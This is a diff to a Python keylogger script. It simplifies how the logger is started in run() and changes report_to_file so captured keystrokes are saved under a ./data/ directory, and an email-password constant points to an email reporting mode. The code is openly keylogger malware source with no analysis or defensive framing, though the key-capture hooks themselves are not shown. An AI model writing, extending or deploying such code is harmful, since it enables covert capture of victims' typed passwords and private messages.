@@ -17,14 +17,8 @@ EMAIL_PASSWORD = "password_here"
 
 
 def run(**args):
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-    
-    def returnValue(keylogger):
-        print("function return started" + keylogger.__str__)
-        return keylogger.__str__
-    
-    Thread(target = keylogger.start()).start()
-    return Thread(target = returnValue(keylogger)).start()
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")   
+    keylogger.start()
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -69,10 +63,11 @@ class Keylogger:
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
     def report_to_file(self):
+        path = "./data/" + self.filename
         """This method creates a log file in the current directory that contains
         the current keylogs in the `self.log` variable"""
         # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
+        with open(f"{path}.txt", "w") as f:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
